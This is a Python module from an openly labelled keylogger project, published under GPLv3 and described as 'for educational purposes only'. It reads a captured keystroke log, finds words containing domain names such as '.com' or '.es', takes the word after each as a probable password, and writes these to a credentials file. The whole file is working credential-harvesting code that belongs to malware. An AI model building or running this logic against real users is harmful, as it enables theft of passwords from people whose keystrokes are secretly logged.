# This script is a keylogger for educational purposes only.
# Author: @juanmafe.
# GPLv3 2022.

from SaveFile import SaveFile
from CheckFile import CheckFile
from Properties import Properties

class DetectPassword():

	def detect_and_obtain_possible_passwords():

		CheckFile.check_keylog_file()
		CheckFile.check_credentials_file()

		with open(Properties.path_keylog_file, "r") as fileOpened:
			data = str(fileOpened.read())
			DetectPassword.obtain_possible_passwords(data)

		fileOpened.close()


	def obtain_possible_passwords(data):

		possible_passwords = []
		data_splitted = DetectPassword.split_and_clean_data(data)

		for word in data_splitted:
			if DetectPassword.previous_word_domain_filters(word) and DetectPassword.password_out_of_range_check(data_splitted, word) :
				possible_password = data_splitted[data_splitted.index(word) + 1]
				possible_passwords.append(possible_password + Properties.enter)

		SaveFile.save_in_credentials(Properties.empty.join(map(str, possible_passwords)))


	def split_and_clean_data(data):
		data_splitted = data.split(Properties.whitespace)
		return [string for string in data_splitted if string != Properties.empty]


	def previous_word_domain_filters(word):
		return (Properties.domain_es in word) or (Properties.domain_com in word) or (Properties.domain_eip in word)


	def password_out_of_range_check(data_splitted, word):
		return data_splitted.index(word) != len(data_splitted) -1

#EOF